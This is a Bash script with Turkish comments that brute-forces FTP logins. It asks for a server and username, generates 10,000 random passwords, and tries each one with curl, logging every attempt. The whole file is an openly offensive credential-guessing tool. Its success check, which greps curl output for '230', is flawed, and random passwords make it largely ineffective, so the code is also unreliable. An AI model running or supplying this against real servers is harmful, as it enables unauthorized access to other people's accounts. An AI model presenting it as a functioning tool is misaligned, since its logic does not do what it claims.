#!/bin/bash

# Kullanıcıdan input al
read -p "FTP Sunucusu: " SERVER
read -p "Kullanıcı adı: " USER

# Log dosyası
LOG_FILE="bruteforce.log"

# Log dosyasını temizle
> "$LOG_FILE"

# Rastgele parola oluşturma fonksiyonu
generate_passwords() {
  tr -dc 'A-Za-z0-9' < /dev/urandom | fold -w 10 | head -n 10000
}

# Parola listesini oluştur
PASS_LIST="passwords.txt"
generate_passwords > "$PASS_LIST"

# Brute force saldırısı
while IFS= read -r PASS; do
  echo "Trying $USER:$PASS"
  echo "Trying $USER:$PASS" >> "$LOG_FILE"
  RESPONSE=$(curl -s --user "$USER:$PASS" "ftp://$SERVER" | grep "230")
  if [ -n "$RESPONSE" ]; then
    echo "Login successful: $USER:$PASS"
    echo "Login successful: $USER:$PASS" >> "$LOG_FILE"
    exit 0
  fi
done < "$PASS_LIST"

echo "Brute force attack finished."
echo "Brute force attack finished." >> "$LOG_FILE"
exit 1